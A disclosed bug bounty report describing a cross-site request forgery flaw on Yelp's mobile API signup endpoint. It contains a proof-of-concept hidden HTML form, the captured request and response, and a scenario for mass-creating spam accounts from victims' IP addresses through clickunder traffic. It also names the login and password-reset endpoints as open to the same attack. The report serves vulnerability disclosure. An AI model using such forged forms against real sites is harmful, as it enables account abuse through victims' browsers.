# CSRF on signup endpoint (auto-api.yelp.com)

## Report Details
- **Report ID**: 178831
- **URL**: https://hackerone.com/reports/178831
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-10-29T14:59:58.731Z
- **Disclosed**: 2017-03-01T17:49:09.936Z

## Reporter
- **Username**: denispugachev
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: yelp

## Vulnerability Information
Sign up request on https://auto-api.yelp.com/account/create_secure endpoint processes without any checking headers (without cookies, csrf tokens and even user-agent). 

This is sample HTML form:
---

        <html>
        <head></head>
        <body>
        <form action="https://auto-api.yelp.com/account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D" method="post">
        <input type="hidden" name="first_name" value="Test1" />
        <input type="hidden" name="last_name" value="Test2" />
        <input type="hidden" name="email" value="██████████" />
        <input type="hidden" name="password" value="123123qq" />
        <input type="hidden" name="user_country_code" value="AR" />
        <input type="hidden" name="city" value="12333" />
        <input type="hidden" name="confirmed" value="0" />
        
        
        <input type="submit" />
        </form>
        </body>
        </html>
        
Maybe when you will check it the signature will be expired, but it is not very difficult to generate the new one.

Request / Response
---
	POST /account/create_secure?time=1477751842&nonce=lej%2F%2FQ%3D%3D&ywsid=Y3yWooClkisSbx32yJG5Ww&device_type=generic%2Bvbox86p%2FKTU84P&app_version=8.16.0&cc=US&lang=en&efs=cDV544hzFZZpMD6wPVsW0GCyHGRNWhykWC%2BKKikA3b3E%2BohV0t%2FxA0eh5tL1sLQnkasS3MI2wLlfhZ01oKUYMwXvUlRB5mRf8Mit5OryQ7o%3D&signature=_qGv3pOMHN%2BUSpUucP3dKxjwALjI%3D HTTP/1.1
	Accept-Encoding: gzip
	Content-Type: application/x-www-form-urlencoded
	Content-Encoding: UTF-8
	Host: auto-api.yelp.com
	Connection: Keep-Alive
	Content-Length: 125

	first_name=Test1&last_name=Test2&email=█████&password=123123qq&user_country_code=AR&city=12333&confirmed=0

*****RESPONSE*****


	HTTP/1.1 200 OK
	Date: Sat, 29 Oct 2016 14:42:19 GMT
	Content-Type: application/json; charset=UTF-8
	Transfer-Encoding: chunked
	Connection: keep-alive
	Set-Cookie: __cfduid=d35a860a4d504b624ad0351d3bcdb467e1477752138; expires=Sun, 29-Oct-17 14:42:18 GMT; path=/; domain=.yelp.com; HttpOnly
	X-Node: api_com
	Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private
	Expires: Sat, 29 Oct 2016 14:42:19 GMT
	Pragma: no-cache
	Set-Cookie: bse=9e2087a24cf46f0ac9ffc3a568f27917; Domain=.yelp.com; Path=/; HttpOnly
	Set-Cookie: yuv=██████████████; Domain=.yelp.com; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT
	X-Content-Type-Options: nosniff
	Set-Cookie: api_s=██████████; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; HttpOnly
	Set-Cookie: api_ss=███████; Max-Age=630720000; Path=/; expires=Fri, 24-Oct-2036 14:42:19 GMT; secure; HttpOnly
	X-Node: web19-r4-sfo2
	Vary: Accept-Encoding,User-Agent
	Content-Encoding: gzip
	X-Mode: rw
	X-Proxied: extlb7-r10-sfo2
	X-Mode: rw
	X-Proxied: extlb4-r9-iad1
	Server: cloudflare-nginx
	CF-RAY: 2f9764b29e8e3798-ARN

	{"first_name": "Test1", "last_name": "Test2", "user_id": "█████", "name": "Test1 T.", "is_confirmed": false, "expiry": 1485528139, "location": "La Matanza", "name_without_period": "Test1 T", "message": {"text": "OK", "code": 0, "version": "1.1.1", "request_id": "428b82b44de28038"}, "email": "█████", "last_initial": "T"}

How it can be exploitable? 
---
Attacker can make many hidden forms with pre-generated sign up fields to make accounts from victim's IP address (for example very cheap clickunder traffic on special HTML page with hidden form). Later created accounts can be used for spam purposes.

It can be done also with login and password forget endpoint: https://auto-api.yelp.com/account/login_secure
https://auto-api.yelp.com/account/send_password_email_secure


***Please check saved Charles session file in attachments***

## Attachments
- signup_csrf.html
- session.chls
